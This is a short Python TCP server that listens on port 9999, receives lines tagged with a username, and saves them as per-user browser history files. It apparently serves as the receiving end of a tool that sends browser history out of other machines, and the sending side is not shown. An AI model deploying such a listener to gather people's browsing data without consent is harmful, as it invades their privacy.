import socket
from datetime import datetime

HOST = '0.0.0.0'
PORT = 9999

def save_history(username, entries):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"browser_history_{username}_{timestamp}.txt"
    with open(filename, "w", encoding='utf-8') as f:
        f.write(f"Browser history for user: {username}\n")
        f.write("="*50 + "\n\n")
        for entry in entries:
            f.write(entry + "\n")
    print(f"[+] History saved to {filename}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print("[*] Server listening...")

    conn, addr = s.accept()
    with conn:
        print(f"[*] Connected by {addr}")
        username = None
        data_buffer = []

        while True:
            data = conn.recv(1024).decode('utf-8')
            if not data:
                break

            lines = data.split('\n')
            for line in lines:
                line = line.strip()
                if line.startswith("USER:"):
                    username = line.replace("USER:", "")
                    print(f"[*] Receiving history for user: {username}")
                elif line == '__END__':
                    if username:
                        save_history(username, data_buffer)
                    else:
                        print("[!] No username received, skipping save.")
                    data_buffer = []
                elif line != '':
                    data_buffer.append(line)
